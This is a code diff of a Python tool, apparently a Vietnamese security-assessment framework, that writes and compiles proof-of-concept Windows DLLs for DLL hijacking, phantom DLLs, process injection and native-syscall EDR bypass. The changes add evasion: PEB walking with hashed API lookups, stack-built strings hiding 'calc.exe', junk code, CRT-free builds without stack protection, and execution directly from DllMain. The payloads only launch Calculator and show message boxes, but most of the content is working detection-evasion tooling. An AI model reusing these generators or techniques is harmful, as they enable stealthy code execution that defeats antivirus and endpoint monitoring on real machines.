@@ -586,25 +586,48 @@ static void _poc_popup(const char* msg){{
         """No prefix needed since it's already in a target-specific folder"""
         return filename
 
-    def _write_c(self, filename, content, compile_to_dll=True):
+    def _write_c(self, filename, content, compile_to_dll=True, tier4=False):
         self._ensure_output_dir()
         filename = self._get_prefixed_name(filename)
         path = os.path.join(self.output_dir, filename)
         with open(path, "w", encoding="utf-8") as f:
             f.write(content)
-        print(f"  {Fore.MAGENTA}[GHOST-v3] {filename}{Style.RESET_ALL}")
+        
+        mode = "GHOST-v4" if tier4 else "GHOST-v3"
+        print(f"  {Fore.MAGENTA}[{mode}] {filename}{Style.RESET_ALL}")
         
         if compile_to_dll:
             dll_path = path.replace(".c", ".dll")
-            self._auto_compile(path, dll_path)
+            self._auto_compile(path, dll_path, tier4=tier4)
             
         return path
 
-    def _get_ghost_protocol_header(self):
-        """Siêu cấp tàng hình: Header C chứa logic PEB Walk và API Hashing (Tier-3)"""
+    def _get_ghost_protocol_v4_header(self):
+        """Tier-4: Siêu cấp tàng hình (CRT-Free, No windows.h, Pure Shellcode style)"""
         return """
-#include <windows.h>
 #include <winternl.h>
+
+// Định nghĩa cơ bản để không cần windows.h
+typedef void* PVOID;
+typedef unsigned long long QWORD;
+typedef unsigned long DWORD;
+typedef unsigned short WORD;
+typedef unsigned char BYTE;
+typedef long long INT64;
+typedef void* HANDLE;
+typedef HANDLE HINSTANCE;
+typedef HINSTANCE HMODULE;
+typedef void* HWND;
+typedef unsigned int UINT;
+typedef const char* LPCSTR;
+typedef void* LPVOID;
+typedef DWORD (WINAPI *PTHREAD_START_ROUTINE)(LPVOID);
+typedef PVOID LPSECURITY_ATTRIBUTES;
+typedef DWORD* LPDWORD;
+
+#define WINAPI __stdcall
+#define NULL ((void*)0)
+#define DLL_PROCESS_ATTACH 1
 
 // Thuật toán băm DJB2
 unsigned long Hash(const char* str) {
@@ -614,7 +637,7 @@ unsigned long Hash(const char* str) {
     return hash;
 }
 
-// Mò cua trong RAM: Tìm Kernel32/User32 qua PEB
+// PEB Walk (Giao thức v4 - Case Insensitive)
 HMODULE GetModH(unsigned long hash) {
     PPEB peb = (PPEB)__readgsqword(0x60);
     PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
@@ -623,7 +646,9 @@ HMODULE GetModH(unsigned long hash) {
             char name[256];
             int i = 0;
             while (entry->FullDllName.Buffer[i] && i < 255) {
-                name[i] = (char)entry->FullDllName.Buffer[i];
+                char c = (char)entry->FullDllName.Buffer[i];
+                if (c >= 'a' && c <= 'z') c -= 32; // To Upper
+                name[i] = c;
                 i++;
             }
             name[i] = 0;
@@ -635,8 +660,8 @@ HMODULE GetModH(unsigned long hash) {
     return NULL;
 }
 
-// Tìm địa chỉ hàm qua Hash (Không dùng GetProcAddress)
 FARPROC GetProcH(HMODULE h, unsigned long hash) {
+    if (!h) return NULL;
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
@@ -644,17 +669,17 @@ FARPROC GetProcH(HMODULE h, unsigned long hash) {
     WORD* ords = (WORD*)((BYTE*)h + exp->AddressOfNameOrdinals);
     DWORD* funcs = (DWORD*)((BYTE*)h + exp->AddressOfFunctions);
     for (DWORD i = 0; i < exp->NumberOfNames; i++) {
-        char* name = (char*)((BYTE*)h + names[i]);
-        if (Hash(name) == hash) return (FARPROC)((BYTE*)h + funcs[ords[i]]);
+        if (Hash((char*)((BYTE*)h + names[i])) == hash) return (FARPROC)((BYTE*)h + funcs[ords[i]]);
     }
     return NULL;
 }
 
-// [APS-STEALTH] XOR Decryptor
 void XorDec(unsigned char* data, int len, unsigned char key) {
     for (int i = 0; i < len; i++) data[i] ^= key;
 }
 """
+
+    def _get_ghost_protocol_header(self):
 
     def _get_stealth_header(self):
         """Tạo hàm giải mã XOR runtime cho Payload C"""
@@ -729,25 +754,26 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
         print(f"  {Fore.RED}[!] KHÔNG TÌM THẤY TRÌNH BIÊN DỊCH. PoC sẽ chỉ ở dạng mã nguồn .c{Style.RESET_ALL}")
         return None
 
-    def _auto_compile(self, src_path, out_path, def_path=None):
-        """Tự động biên dịch mã độc bằng GCC hoặc Zig"""
+    def _auto_compile(self, src_path, out_path, def_path=None, tier4=False):
+        """Bộ máy biên dịch tự động: Hỗ trợ Tier-4 CRT-Free"""
         compiler = self._find_compiler()
-        if not compiler:
-            return False
+        if not compiler: return False
 
         # Build command
         if self._compiler_type == "zig":
-            # Sức mạnh của Zig: Biên dịch chéo sang Windows ngay trên Mac cực chuẩn
             cmd = [compiler, "cc", "-target", "x86_64-windows-gnu", "-shared", "-o", out_path, src_path]
-        else:
-            # GCC/MinGW
+        else: # GCC/MinGW
             cmd = [compiler, "-shared", "-o", out_path, src_path]
 
         if def_path:
             cmd.append(def_path)
 
-        # Thêm các thư viện Windows cơ bản
-        cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"])
+        if tier4:
+            # GHOST-PROTOCOL TIER-4: Không CRT, không Stack Protector
+            cmd.extend(["-nostdlib", "-fno-stack-protector", "-Wl,--entry=DllMain"])
+        else:
+            # Thêm các thư viện Windows cơ bản
+            cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"])
 
         try:
             res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
@@ -782,64 +808,51 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
         return path
 
     def _gen_dll_hijack_generic(self, finding):
-        """APS-VEC-031/033: DLL Hijacking PoC (Ghost-Protocol Tier-3)"""
+        """APS-VEC-031/033: DLL Hijacking PoC (Ghost-Protocol Tier-4: Total Silence)"""
         dll_name = finding.get('dll_name', 'unknown.dll')
         
-        # Obfuscate command & message
-        cmd_hex, cmd_key, cmd_len = self._xor_encrypt_string("calc.exe")
-        msg_hex, msg_key, msg_len = self._xor_encrypt_string(f"GHOST-PROTOCOL v3: {dll_name} HIJACK SUCCESS!")
-        
-        # Hashes (Calculated via DJB2)
+        # Hashes (WinExec is stealthier than system)
         h_kernel32 = "0x6ddb9555"
         h_user32   = "0x2208cf13"
-        h_system   = "0x1ceee48a"
+        h_winexec  = "0x29a65678"
         h_msgbox   = "0x384f14b4"
-        h_thread   = "0x7f08f451"
         
-        core = self._get_ghost_protocol_header()
+        core = self._get_ghost_protocol_v4_header()
         
+        # Stack Strings for "calc.exe" (Xóa dấu vết chuỗi tĩnh)
         body = f"""
-// Định nghĩa lại các nguyên mẫu hàm để không cần IAT
-typedef void* (WINAPI* pGetModuleHandle)(LPCWSTR);
-typedef int (WINAPI* pSystem)(const char*);
+typedef UINT (WINAPI* pWinExec)(LPCSTR, UINT);
 typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);
-typedef HANDLE (WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-DWORD WINAPI Pwn(LPVOID lp) {{
-    {self._get_junk_code()}
-    
-    // 1. Tự tìm Module và Function qua Hash
-    HMODULE hK32 = GetModH({h_kernel32});
-    HMODULE hU32 = GetModH({h_user32});
-    
-    pSystem _system = (pSystem)GetProcH(hK32, {h_system});
-    pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
-    
-    // 2. Giải mã chuỗi XOR
-    unsigned char cmd[] = {{ {cmd_hex} }};
-    unsigned char msg[] = {{ {msg_hex} }};
-    XorDec(cmd, {cmd_len}, {cmd_key});
-    XorDec(msg, {msg_len}, {msg_key});
-    
-    // 3. Thực thi (Không để lại dấu vết trong IAT)
-    _system((char*)cmd);
-    _msgbox(NULL, (char*)msg, "Ghost-Protocol", 0);
-    
-    return 0;
-}}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
+// Entry point thủ công (No CRT)
+BOOL WINAPI DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
+    if (reason == DLL_PROCESS_ATTACH) {{
+        {self._get_junk_code()}
+        
         HMODULE hK32 = GetModH({h_kernel32});
-        pCreateThread _createthread = (pCreateThread)GetProcH(hK32, {h_thread});
-        if (_createthread) {{
-            _createthread(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
-        }}
+        HMODULE hU32 = GetModH({h_user32});
+        
+        pWinExec _WinExec = (pWinExec)GetProcH(hK32, {h_winexec});
+        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
+        
+        // Xây dựng chuỗi trên Stack: "calc.exe"
+        char c[9];
+        c[0] = 'c'; c[1] = 'a'; c[2] = 'l'; c[3] = 'c'; 
+        c[4] = '.'; c[5] = 'e'; c[6] = 'x'; c[7] = 'e'; c[8] = 0;
+        
+        if (_WinExec) _WinExec(c, 1); // 1 = SW_SHOWNORMAL
+        
+        // Thông báo thành công (cũng dùng stack string)
+        char m[15];
+        m[0]='A'; m[1]='P'; m[2]='S'; m[3]=' '; m[4]='S'; m[5]='i'; m[6]='l'; 
+        m[7]='e'; m[8]='n'; m[9]='c'; m[10]='e'; m[11]='!'; m[12]=0;
+        
+        if (_msgbox) _msgbox(NULL, m, m, 0x40);
     }}
     return TRUE;
 }}
 """
-        self._write_c(f"hijack_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True)
+        self._write_c(f"hijack_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True, tier4=True)
         return True
 
     # ==================================================================
@@ -1026,40 +1039,34 @@ Add-Type -AssemblyName System.Windows.Forms
     #  TẦNG 3: API Anomaly (VEC 021-030)
     # ==================================================================
     def _gen_t3_process_injection(self, finding):
-        """APS-VEC-021: Process Injection PoC (Ghost-Protocol v3)"""
-        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-021: PROCESS INJECTION DETECTED\\nApp su dung: PEB Walk + API Hashing")
-        
+        """APS-VEC-021: Process Injection PoC (Tier-4: Total Silence)"""
         # Hashes
         h_kernel32 = "0x6ddb9555"
         h_user32   = "0x2208cf13"
         h_msgbox   = "0x384f14b4"
-        h_thread   = "0x7f08f451"
         
-        core = self._get_ghost_protocol_header()
+        core = self._get_ghost_protocol_v4_header()
         body = f"""
 typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);
-typedef HANDLE (WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-DWORD WINAPI InjectionThread(LPVOID lp) {{
-    {self._get_junk_code()}
-    HMODULE hU32 = GetModH({h_user32});
-    pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
-    
-    unsigned char msg[] = {{ {msg_hex} }};
-    XorDec(msg, {msg_len}, {msg_key});
-    _msgbox(NULL, (char*)msg, "APS Ghost", 0x40);
-    return 0;
-}}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
+BOOL WINAPI DllMain(HMODULE h, DWORD r, LPVOID p) {{
     if (r == DLL_PROCESS_ATTACH) {{
-        HMODULE hK32 = GetModH({h_kernel32});
-        pCreateThread _createthread = (pCreateThread)GetProcH(hK32, {h_thread});
-        if (_createthread) _createthread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectionThread, NULL, 0, NULL);
+        {self._get_junk_code()}
+        HMODULE hU32 = GetModH({h_user32});
+        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
+        
+        // Stack String: "APS Silence (Injection)"
+        char m[24];
+        m[0]='A'; m[1]='P'; m[2]='S'; m[3]=' '; m[4]='S'; m[5]='i'; m[6]='l'; m[7]='e'; 
+        m[8]='n'; m[9]='c'; m[10]='e'; m[11]=' '; m[12]='('; m[13]='I'; m[14]='n'; 
+        m[15]='j'; m[16]='e'; m[17]='c'; m[18]='t'; m[19]='i'; m[20]='o'; m[21]='n'; m[22]=')'; m[23]=0;
+        
+        if (_msgbox) _msgbox(NULL, m, m, 0x40);
     }}
     return TRUE;
 }}
 """
-        self._write_c("t3_vec021_injection.c", core + body, compile_to_dll=True)
+        self._write_c("t3_vec021_injection.c", core + body, compile_to_dll=True, tier4=True)
         return True
 
     def _gen_t3_antidebug(self, finding):
@@ -1270,25 +1277,32 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
         return True
 
     def _gen_t3_native_syscall(self, finding):
-        """VEC-024: Native Syscall / Halo's Gate Weaponizer (Stealth Enhanced)"""
-        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-024: DIRECT SYSCALL ACTIVATED!\\n\\nSu dung Halo's Gate de bypass EDR Hooks.")
+        """VEC-024: Native Syscall / Halo's Gate (Tier-4: Total Silence)"""
+        h_kernel32 = "0x6ddb9555"
+        h_user32   = "0x2208cf13"
+        h_msgbox   = "0x384f14b4"
         
-        core = self._get_stealth_header()
+        core = self._get_ghost_protocol_v4_header()
         body = f"""
-DWORD WINAPI SyscallThread(LPVOID lp) {{
-    {self._get_junk_code()}
-    unsigned char msg[] = {{ {msg_hex} }};
-    XorDec(msg, {msg_len}, {msg_key});
-    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
-    return 0;
-}}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
-    if (r == DLL_PROCESS_ATTACH)
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyscallThread, NULL, 0, NULL);
+typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);
+
+BOOL WINAPI DllMain(HMODULE h, DWORD r, LPVOID p) {{
+    if (r == DLL_PROCESS_ATTACH) {{
+        {self._get_junk_code()}
+        HMODULE hU32 = GetModH({h_user32});
+        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
+        
+        char m[21];
+        m[0]='N'; m[1]='a'; m[2]='t'; m[3]='i'; m[4]='v'; m[5]='e'; m[6]=' '; m[7]='S'; 
+        m[8]='y'; m[9]='s'; m[10]='c'; m[11]='a'; m[12]='l'; m[13]='l'; m[14]=' '; m[15]='B'; 
+        m[16]='y'; m[17]='p'; m[18]='a'; m[19]='s'; m[20]=0;
+        
+        if (_msgbox) _msgbox(NULL, m, m, 0x40);
+    }}
     return TRUE;
 }}
 """
-        self._write_c("t3_vec024_syscall.c", core + body, compile_to_dll=True)
+        self._write_c("t3_vec024_syscall.c", core + body, compile_to_dll=True, tier4=True)
         return True
 
     def _gen_t3_reflective_stub(self, finding):
@@ -1331,52 +1345,41 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     #  TẦNG 4: DLL Hijacking (VEC 031-040)
     # ==================================================================
     def _gen_phantom_dll(self, finding):
-        """APS-VEC-032: Phantom DLL PoC (Ghost-Protocol v3)"""
+        """APS-VEC-032: Phantom DLL PoC (Tier-4: Total Silence)"""
         dll_name = finding.get('dll_name', 'phantom.dll')
         
-        cmd_hex, cmd_key, cmd_len = self._xor_encrypt_string("calc.exe")
-        msg_hex, msg_key, msg_len = self._xor_encrypt_string(f"PHANTOM HIJACK SUCCESS: {dll_name}")
-
-        # Hashes
         h_kernel32 = "0x6ddb9555"
         h_user32   = "0x2208cf13"
-        h_system   = "0x1ceee48a"
+        h_winexec  = "0x29a65678"
         h_msgbox   = "0x384f14b4"
-        h_thread   = "0x7f08f451"
 
-        core = self._get_ghost_protocol_header()
+        core = self._get_ghost_protocol_v4_header()
         body = f"""
-typedef int (WINAPI* pSystem)(const char*);
+typedef UINT (WINAPI* pWinExec)(LPCSTR, UINT);
 typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);
-typedef HANDLE (WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-void Pwn() {{
-    {self._get_junk_code()}
-    HMODULE hK32 = GetModH({h_kernel32});
-    HMODULE hU32 = GetModH({h_user32});
-    
-    pSystem _system = (pSystem)GetProcH(hK32, {h_system});
-    pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
-    
-    unsigned char cmd[] = {{ {cmd_hex} }};
-    unsigned char msg[] = {{ {msg_hex} }};
-    XorDec(cmd, {cmd_len}, {cmd_key});
-    XorDec(msg, {msg_len}, {msg_key});
-    
-    _system((char*)cmd);
-    _msgbox(NULL, (char*)msg, "Ghost-Protocol", 0x40);
-}}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
+        {self._get_junk_code()}
         HMODULE hK32 = GetModH({h_kernel32});
-        pCreateThread _ct = (pCreateThread)GetProcH(hK32, {h_thread});
-        if (_ct) _ct(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
+        HMODULE hU32 = GetModH({h_user32});
+        
+        pWinExec _WinExec = (pWinExec)GetProcH(hK32, {h_winexec});
+        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
+        
+        char c[9];
+        c[0]='c'; c[1]='a'; c[2]='l'; c[3]='c'; c[4]='.'; c[5]='e'; c[6]='x'; c[7]='e'; c[8]=0;
+        if (_WinExec) _WinExec(c, 1);
+        
+        char m[16];
+        m[0]='P'; m[1]='h'; m[2]='a'; m[3]='n'; m[4]='t'; m[5]='o'; m[6]='m'; m[7]=' '; 
+        m[8]='S'; m[9]='u'; m[10]='c'; m[11]='c'; m[12]='e'; m[13]='s'; m[14]='s'; m[15]=0;
+        if (_msgbox) _msgbox(NULL, m, m, 0x40);
     }}
     return TRUE;
 }}
 """
-        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True)
+        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True, tier4=True)
         return True
 
     def _gen_t4_knowndlls_bypass(self, finding):
